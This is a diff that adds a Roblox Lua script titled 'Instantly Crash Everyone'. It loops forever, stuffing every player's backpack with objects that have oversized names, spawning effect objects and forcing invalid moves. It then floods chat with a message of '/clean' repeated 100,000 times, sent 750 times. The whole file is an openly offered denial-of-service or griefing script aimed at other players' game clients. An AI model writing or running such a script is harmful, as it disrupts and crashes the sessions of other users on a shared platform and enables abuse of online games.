@@ -1,0 +1,33 @@
+warn("This..>-!Instantly Crash Everyone")--EFFECTS YOU THO
+--instantly crash people.
+x=math.huge
+for i=1,x do
+    wait()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character then
+            local lag = Instance.new ("HopperBin")-- the lag
+            lag.Name = "Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash-Lag-Crash"
+            lag.Parent = player.Backpack
+            wait()
+            local f = Instance.new ("ForceField")
+            local v = Instance.new ("Fire")
+            local b = Instance.new ("Smoke")
+            f.Parent = workspace
+            v.Parent = workspace
+            b.Parent = workspace
+            player.Character:MoveTo(Vector3.new(f, v, b))
+            player.Character:MoveTo(Vector3.new(f, v, b))
+            player.Character:MoveTo(Vector3.new(f, v, b))
+        end
+    end
+end
+wait(1.5)
+
+
+local prefixe = "/"
+
+local Message = (prefixe.. "clean".." "):rep(100000)
+
+for i = 1, 750 do
+    game.Players:Chat(Message)
+end
